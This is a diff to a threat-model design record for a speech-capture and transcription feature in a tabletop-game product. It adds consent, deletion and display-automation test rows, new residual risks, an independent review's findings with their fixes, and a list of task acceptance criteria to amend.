+| LV-32 | **Consent evidence** (LS-35): consent and withdrawal records are append-only — no route or role updates or deletes one (a privilege test once `1ir.1.13`'s roles exist); a record holds the account, session, disclosure version, choice, age attestation and time, nothing else; an account reads its own history and another account's is SEC-3's `404`; the GM sees counts only; the records outlive a campaign's or an account's deletion as tombstones | TM-21, TM-45 | `1ir.3.1`, `1ir.6.2` |
+| LV-33 | **Deletion reaches every copy** (LS-40): deleting a campaign with a window open refuses the next chunk before the cascade commits; canaries in its transcripts, events, cards, recordings and namespace rows are gone afterwards, its data key destroyed (LV-17), its consent, audit and ledger rows tombstoned; deleting an account deletes its owned campaigns the same way, removes its seats elsewhere as narrowings (SEC-42) and tombstones its consent records | TM-19, TM-30 | `1ir.6.1`, `1ir.6.2` |
+| LV-34 | **Display automation needs Enforced** (LS-24): while a campaign is not Enforced, a live-card Share, the reveal hand-off, a share by rule, a rule re-display and recap publication are each refused, the flag read from the locked `authz_state` row; the reveal sheet's own Confirm is not refused | TM-01 | `1ir.4.7`, `1ir.11.1`, `1ir.11.3` |
 
 T-15 and T-16 are the Workbench's (capacity and fail-closed browser tests); TM-20 and
 TM-46 lean on them.
@@ -523,6 +526,10 @@ accepted yet.** The owner writes an answer in the last column (section 13).
 | RR-15 | **Recording changes how people play** | Opt-in defaults and push-to-talk first reduce it | TM-21 | pending |
 | RR-16 | **Anyone can record with another device** | Outside the product | TM-21 | pending |
 | RR-17 | **If the owner lets a screen pause (LQ-10), anyone at a room's screen can pause capture, repeatedly** | A pause is never refused (LS-7, LS-37): safety wins over availability; the GM's remedy is ending the window or the session | TM-27 | pending |
+| RR-18 | **Bystanders are captured** — people in earshot who hold no account and never see the table client: family at home, a neighbouring table in a store | The roster, push-to-talk, short windows and hold-back reduce it; no software hears who is in earshot, and LQ-3's method waits on counsel | TM-22 | pending |
+| RR-19 | **Until `yje.5.2`'s reservation exists, capture spend is bounded by coarse limits only**: scripted capture, or a stolen GM cookie, can spend before a limit trips | The ledger records after the call (LR-15); allowances and kill switches bound it | TM-13 | pending |
+| RR-20 | **A transcript error can harm someone** — a misheard word read as a player's, a recap draft that says what nobody said | Speech-to-text errs; evidence labels, no attribution, GM correction and GM-approved recaps reduce it | TM-28 | pending |
+| RR-21 | **Capture can crowd out login, chat and table streams** until the load test runs with capture in it | Two instances of twenty requests (LR-12); LS-42's bounds are suggested numbers, not yet measured | TM-46 | pending |
 
 ## 11. Decisions for the owner
 
@@ -555,7 +562,7 @@ the following, each for the child bead named. **Nothing here answers any of them
 | CQ-5 | Is deleting the whole session's transcripts on one participant's request required, permitted, or a problem for the others; and how is a request from a person without an account verified? | `1ir.1.4.4` |
 | CQ-6 | Which age threshold applies to capture, by jurisdiction, and does the account's own age gate change anything? | `1ir.1.4.3` |
 | CQ-7 | Does the speech-to-text processor receiving speech before a safety phrase is detected, under zero-retention terms, change any analysis? | `1ir.1.4.1` |
-| CQ-8 | When a GM shares a screen showing transcript text with the other participants, is that a separate use or disclosure of the recording (research draft question 17)? | `1ir.1.4.1` |
+| CQ-8 | When a GM shares a screen showing transcript text with the other participants, is that a separate use or disclosure of the recording? (Research draft question 17 asks this of recap display and export after a capture defect.) | `1ir.1.4.1` |
 
 ## 13. Acceptance
 
@@ -565,8 +572,8 @@ recorded on `1ir.1.3` and on the Phase 0 gate `1ir.13.1`.
 | Item | State |
 | --- | --- |
 | Status | Proposed, 2026-09-29 |
-| Independent review by someone other than the author (the bead's acceptance) | **Pending** — section 14.2 |
-| The owner's written answer on each residual risk RR-1 to RR-17 (the bead's acceptance) | **Pending** — section 10 |
+| Independent review by someone other than the author (the bead's acceptance) | **Done** — section 14.2 |
+| The owner's written answer on each residual risk RR-1 to RR-21 (the bead's acceptance) | **Pending** — section 10 |
 | The owner's answers to LQ-1 to LQ-10 | **Pending**; the defaults in section 11 are in force meanwhile |
 | Counsel's answers to CQ-1 to CQ-8 and the research draft's section 7.11 | **Pending** under `1ir.1.4` |
 | What accepting does | The LS rules bind the beads of section 15.4; each TM row's controls become acceptance criteria of its owning beads; the research draft's sections 2 to 6, 8 and 9 read as superseded by this record, and its section 7 stays as research |
@@ -599,10 +606,46 @@ signed-URL residual; the screen grant's `Path=/table` keeps it off every GM live
 
 ### 14.2 Independent review
 
-**Pending.** The bead requires a review by someone other than this record's author. It
-should verify every fact of section 3 in a worktree, walk each boundary of section 5.3
-against the rules, and check that every TM row's owners and obligations are real. Its
-findings and dispositions go here, as the Workbench threat model's section 13.2 does.
+An agent instance other than the author reviewed `d31677e` (PR #184) read-only on
+2026-09-29, against `origin/integration/1kg-workbench` at `29197d5`. It re-checked LR-1
+to LR-16 in the code; resolved all 92 cited beads (302 references) with `bd show`;
+checked every path, link and external ID; cross-checked TM and LV references with a
+script that tests its own pattern (83 pairs, all mutual); ran a mutant against
+`checkdocs.ts`; and scanned for legal conclusions, finding one (IR-13). It did not render
+the Mermaid diagram. **Verdict: FAIL — 0 Blocker, 2 High, 6 Medium, 5 Low.** It ruled
+LS-2, LS-6, LS-9, LS-16, LS-34, LS-36 with LQ-2, and section 6.7 sound. A second
+instance verified the rework at `89044be` and **cleared** it; PR #184 merged on that
+basis. The Mediums deferred there, and the Lows, are fixed in this amendment, which is
+reviewed on its own pull request. `IR-n` numbers the findings; the review's own labels,
+in bold, stay because beads cite them, and its `M-n` are not the shared eligibility
+record's.
+
+| # | Severity | Finding | Disposition |
+| --- | --- | --- | --- |
+| IR-1 | High | **H-1.** LS-23 and LS-24 exempted the live-card Share and the reveal hand-off from Enforced, relaxing the accepted M-2 while section 15.3 said M-2 was carried as it stands | **Fixed** at `89044be`: both are display automation and require Enforced (LS-23, LS-24, sections 2, 8.1, 15.3, 15.4) |
+| IR-2 | High | **H-2.** LS-37 let a screen pause and signal as a carried rule, widening SEC-48, D-13 and Workbench section 15.6 | **Fixed** at `89044be`: escalated as LQ-10, default SEC-48 as accepted; RR-17 made conditional; the amendment a Yes needs is in 15.3 |
+| IR-3 | Medium | **M-1.** LV-30 tested only counted accounts; LS-8 binds every account that answered Yes | **Fixed** at `89044be`: LV-30 |
+| IR-4 | Medium | **M-2.** LV-4 obliged `check_payload` to refuse text and decisions; it checks shape only | **Fixed** at `89044be`: a per-kind key allowlist (LV-4, LR-6, LS-29, TM-40) |
+| IR-5 | Medium | **M-3.** Bead acceptance criteria that contradict LS-2, LS-36 with LQ-2, or the no-guest model were not listed for amendment; 15.4 omitted five beads | **Fixed** here (`uzs`): section 15.5, re-verified against the tracker; 15.4 extended |
+| IR-6 | Medium | **M-4.** TM-13, TM-22, TM-28 and TM-46 had Medium or Low–Medium residuals and no RR row, so the owner's acceptance would not cover them | **Fixed** here (`x72`): RR-18 to RR-21; section 13 |
+| IR-7 | Medium | **M-5.** A-7 said D-9 was silent on processors; D-9's own row keeps the privacy notice naming the processor | **Fixed** at `89044be`: LS-19, LQ-4, CQ-3, A-7 and TM-39 narrowed to the in-product consent notice |
+| IR-8 | Medium | **M-6.** LS-35 and LS-40 had no LV row; LS-33, LS-35, LS-37 and LS-40 were cited by no TM control | **Fixed** here (`aq4`): LV-32, LV-33; LV-4 names LS-33's tests; TM-19, TM-21, TM-30, TM-35, TM-36 and TM-45 cite the four rules |
+| IR-9 | Low | **L-1.** LS-16 cited "plan section 6.10", which is the research draft's | **Fixed** here |
+| IR-10 | Low | **L-2.** CQ-8 cited research question 17, which asks about capture defects, not screen sharing | **Fixed** here: CQ-8 says how it relates to question 17 |
+| IR-11 | Low | **L-3.** LS-2 relies on T-17 refusing `SameSite=None`, which `config.py` accepts, without saying so in 15.3 | **Fixed** here: 15.3 |
+| IR-12 | Low | **L-4.** 15.1 left the research draft's residuals 6 and 9 without a disposition | **Fixed** here: 15.1 |
+| IR-13 | Low | **L-5.** LS-36's "the right follows the consent" read as a statement of a legal right | **Fixed** here: "the product's deletion permission" |
+
+Carry items and the verifier's observations:
+
+- **The surviving mutant** — TM-43 citing an LV row and a bead that do not exist passed
+  `checkdocs.ts` — is closed: `checkdocs.ts` now reads this record, and its
+  cross-reference check (`docs/forge/tools/live-session-assistant/threatmodel.ts`) also
+  runs alone in CI. CI has no tracker, so the unknown bead fails only where one is
+  present; the undefined LV row fails everywhere.
+- **No LV row tested that display automation is refused while a campaign is not
+  Enforced** (the verifier): LV-34.
+- **The owner's answers** to sections 10 and 11 remain open; a review accepts nothing.
 
 ## 15. What this changes elsewhere
 
@@ -613,8 +656,11 @@ None of these files is edited by this bead; each row names what a later bead mus
 `docs/forge/research/live-session-assistant-threat-model.md` stays as the research
 record. On acceptance, its sections 2 to 6, 8 and 9 read through this record: TB0 to TB8
 become section 5.3's TB0 to TB12; TM-18 is superseded; TM-11 and TM-33's CSRF tokens are
-replaced by LS-2; TM-30's deletion codes by LS-36; its residual 8 does not arise (MS-7).
-Its section 7 is untouched.
+replaced by LS-2; TM-30's deletion codes by LS-36; its residual 8 does not arise (MS-7);
+its residual 6 is closed for chat Markdown by `va8` (TA-1), the capture page's own policy
+being LS-9's; and its residual 9 does not arise, because the shared eligibility record
+decided the plan's section 2.5 requests (O-2 to O-4 accepted; O-5 accepted in principle,
+gated on `yje.6.1`). Its section 7 is untouched.
 
 ### 15.2 The master plan
 
@@ -634,6 +680,10 @@ Its section 7 is untouched.
 
 - **Workbench threat model, section 12.4** — answered: SEC-7 is adopted with no token
   (LS-2), and one register of provider terms serves SEC-39 and the assistant (LS-16).
+- **Workbench threat model, T-17** — nothing to amend, but LS-2 depends on it: since the
+  section 15 acceptance (TA-4), T-17 asserts that the account cookie is `SameSite=Lax`
+  or `Strict` in the production image. `config.py` still accepts `none`, which would void
+  LS-2's reason (3), so that assertion must stay.
 - **Workbench threat model** — a suggestion for its owner, not a change made here: LS-4's
   navigate refusal would serve its GM `GET` routes as well (TM-41's projector case).
 - **Workbench threat model, SEC-48 and section 15.6** — an amendment, **only if the owner
@@ -652,24 +702,54 @@ Its section 7 is untouched.
 | `1ir.1.5` | LS-16's register, per data class, shared with SEC-39; LS-17; LV-22 |
 | `1ir.1.8` | LS-6's consent subjects and counting, LS-8's age rule, LS-19's notice posture (after LQ-4 and CQ-3) |
 | `1ir.1.13` | The roles of LS-31 and section 8.2; LS-30's settings discipline; LV-3 |
+| `1ir.2.2` | Resolve section 8.1's principals — owner, seated (confirmed or not), other account, screen grant — and no guest or device credential; LV-2 |
 | `1ir.2.3` | LS-25 to LS-26; LS-28 to LS-32 for the projector and composition; LV-4, LV-5, LV-8 |
-| `1ir.3.1`, `1ir.3.2`, `1ir.3.5`, `1ir.3.6` | LS-3; LS-5 to LS-8; LS-35; LS-37; LV-13, LV-15, LV-30 |
+| `1ir.2.7`, `1ir.4.4`, `1ir.5.4` | LS-1, LS-2 for their routes; LV-15 |
+| `1ir.3.1`, `1ir.3.2`, `1ir.3.5`, `1ir.3.6` | LS-3; LS-5 to LS-8; LS-35; LS-37; LV-13, LV-15, LV-30, LV-32 |
 | `1ir.3.3`, `1ir.3.4`, `1ir.4.1` | LS-9; LV-9's header and policy checks |
 | `1ir.4.2`, `1ir.9.1` | LS-1, LS-2, LS-5, LS-10, LS-42; LV-14, LV-16 |
 | `1ir.4.3` | LS-16, LS-17; the kill switch |
 | `1ir.4.5`, `1ir.4.6` | LS-20, LS-21, LS-22; LV-6, LV-9, LV-31 |
-| `1ir.6.1`, `1ir.6.2`, `1ir.6.4` | LS-11, LS-12, LS-14, LS-36, LS-40; LQ-6's step-up; LV-17, LV-18, LV-20, LV-27 |
+| `1ir.6.1`, `1ir.6.2`, `1ir.6.4` | LS-11, LS-12, LS-14, LS-35, LS-36, LS-40; LQ-6's step-up; LV-17, LV-18, LV-20, LV-27, LV-32, LV-33 |
 | `1ir.6.3` | LS-22, LS-38, LS-39; LV-1, LV-12, LV-31 |
+| `1ir.9.3`, `1ir.9.4` | LS-3, LS-5, LS-7; capture state as a boolean on the table slot (LS-27); LS-37; LV-13, LV-15 |
 | `1ir.9.9` | LS-34, LS-37; LV-26 |
-| `1ir.4.7`, `1ir.11.1`, `1ir.11.2`, `1ir.11.5` | LS-23, LS-24, LS-26, LS-27, LS-32; LV-2, LV-11 |
+| `1ir.4.7`, `1ir.11.1`, `1ir.11.2`, `1ir.11.5` | LS-23, LS-24, LS-26, LS-27, LS-32; LV-2, LV-11, LV-34 |
+| `1ir.11.3` | LS-23, LS-24: a Share through the reveal Confirm's path, only once Enforced; LS-2; LV-15, LV-34 |
 | `1ir.12.6` | LS-18 before any browser-to-processor path |
-| `1ir.13.6` | Owns LV-1 to LV-31 as a suite, each bead still owning the rows that name it |
+| `1ir.13.6` | Owns LV-1 to LV-34 as a suite, each bead still owning the rows that name it |
+| `1ir.13.7` | LV-13's scenarios, with section 8.1's principals |
+
+### 15.5 Acceptance criteria to amend on acceptance
+
+Checked against every open `1ir` bead's title, description and acceptance criteria in
+the tracker on 2026-09-29. On acceptance, each clause is amended in one sweep; until
+then, where a clause and a rule disagree, the rule is the default in force. Quoted text
+is the bead's.
+
+| Bead | Clause as it stands | Contradicts | Amend to |
+| --- | --- | --- | --- |
+| `1ir.2.7`, `1ir.3.1`, `1ir.3.6`, `1ir.4.2`, `1ir.4.4`, `1ir.4.6`, `1ir.5.4`, `1ir.6.2`, `1ir.6.4`, `1ir.9.1`, `1ir.9.4`, `1ir.9.9`, `1ir.11.3` | AC: "cross-site Origin and missing-CSRF-token … are rejected (tests)" (`1ir.9.1`: "cross-site Origin, missing-CSRF-token, and wrong-window-token uploads") | LS-2 | "a foreign `Origin`, `Origin: null`, `Sec-Fetch-Site: cross-site`, and a form, multipart or `text/plain` body are rejected (tests, LV-15)"; `1ir.9.1` keeps its wrong-window refusal (LS-5) |
+| `1ir.3.2` | AC: "every answering device is shown a one-time deletion code stored only as a hash (test)"; description: a code "shown after answering" | LS-36, LQ-2 | Strike: a consenting account asks from its account area (LS-36, LV-20) |
+| `1ir.6.2` | AC: "a participant deletion request and a guest deletion-code request each remove the matching transcripts (tests)"; "deletion codes are high-entropy, stored hashed, single-use, rate-limited, and answered with uniform responses (tests)"; description: "by device credential during the session or by one-time deletion code afterwards" | LS-36, LQ-2 | "an account that recorded a Yes in a session deletes that session's transcripts and their derivatives from its account area, its seat removed or not; one that did not gets the same answer and deletes nothing (tests, LV-20)"; strike the code clauses |
+| `1ir.3.1` | AC: "revoked device, rotated table link"; "guest consents lapse on link rotation, and a participant's consent lapses when their personal link is reset"; description: "enrolled or guest table-link devices" | D-1, D-4; LS-6 | "a removed seat, an unconfirmed seat, a revoked screen grant"; "a removed seat's, or a suspended or deleted account's, consent stops counting from that commit, and Rotate lapses none (LS-6(4))"; consents from seated accounts and the owner, never a screen |
+| `1ir.3.2` | Title and description: "table-link consent", "enrolled participant or anonymous guest", a notice "naming the AI processors"; AC: "a new device joining pauses capture until it answers" | D-1, D-4; LS-6(2); LS-19 | "table-client consent" by seated accounts; "a seated account without a Yes for this session, confirmed or not, pauses capture until it answers; a second browser of an account that has answered does not; a screen mint pauses capture until the GM re-attests"; the notice's processor wording waits on LQ-4 and CQ-3 |
+| `1ir.3.6` | AC: "E2E with a GM, a participant, and a guest" | D-1, D-4 | "with the owner, a confirmed seat, an unconfirmed seat and a screen" |
+| `1ir.9.4` | AC: "audit events omit guest identity"; description: "Any participant or rate-limited guest pauses capture" | D-1, D-4; LS-34; LS-37 | "audit rows follow LS-41, and a pause a safety signal causes has no actor (LS-34)"; "any seated account, confirmed or not, pauses capture; a screen only if the owner answers LQ-10 Yes" |
+| `1ir.11.1` | AC: "(participant removal, personal-link reset, character unlink, link rotation)" | D-1, D-4; SEC-42 | "(Remove, character unlink, Rotate, an account's suspension or deletion)" |
+| `1ir.11.2` | AC: "wrong participant, revoked device, ended session, rotated link"; description: "authenticated by live session and enrolled device credential" | D-1, D-4; SEC-41 | "wrong seat, removed seat, unconfirmed seat, ended session, Rotate"; "authenticated by `table_principal` (SEC-41)" |
+| `1ir.5.5`, `1ir.11.4` | AC: "Stop, session end, or link rotation" makes asset references fail (`1ir.11.4`'s description also serves "participants and guests") | D-1, D-4; SEC-42 | "a Stop, session end, Remove or Rotate"; "seated accounts and screens" |
+| `1ir.4`, `1ir.11`, `1ir.12.3`, `1ir.12.10` | AC of the epics: "participants and guests"; descriptions: excerpts "licensed for display to guests", "shown to guests" | D-1, D-4 | "seated accounts and screens"; card endpoints also answer other accounts `404` (section 8.1) |
+| `1ir.2.2`, `1ir.9.3`, `1ir.13.7` | Descriptions only: "participant via enrolled device credential, or anonymous guest"; "participant and guest devices"; "two enrolled participants, and a guest" | D-1, D-4 | Section 8.1's principals; `1ir.13.7`'s scenarios are LV-13's |
+| `1ir.1.8`, `1ir.1.13`, `1ir.3` | Descriptions only: "enrolled participants and anonymous guests through the table link"; "a narrow deletion-code function"; "table-link devices" | D-1, D-4; LQ-2 | Consent by seated accounts through the table client; strike the deletion-code function (15.2's section 4.4 row) |
+| `1ir.1.4.1`, `1ir.1.4.4` | AC: consent mechanics for a "table-link device"; "how anonymous guests exercise deletion rights (one-time deletion codes and a support route)" | D-1, D-4; LQ-2 | The premise only: consent through an account's own device (CQ-1) and deletion by account or through support (CQ-5). **The questions stay counsel's; nothing here answers them** |
 
 ## 16. Open items
 
-- **Tooling:** `docs/forge/tools/live-session-assistant/checkdocs.ts` checks the research
-  draft, not this record; adding it to `DOCS` (or a checker of its own) would cover its
-  tables, paths, bead IDs and TM citations.
+- **Tooling:** `checkdocs.ts` checks this record's tables, paths, bead IDs and
+  cross-references where the tracker is available; CI runs the cross-reference check
+  alone (`threatmodel.ts`). Running the whole of `checkdocs.ts` in CI is open: its path
+  check falls back to `origin/master`, which a pull request's checkout does not fetch.
 - **Presence and consent:** whether the GM's pre-flight may show which aliases have
   answered at all, without their answers, is the design lane's; RR-6 is the risk either
   way.
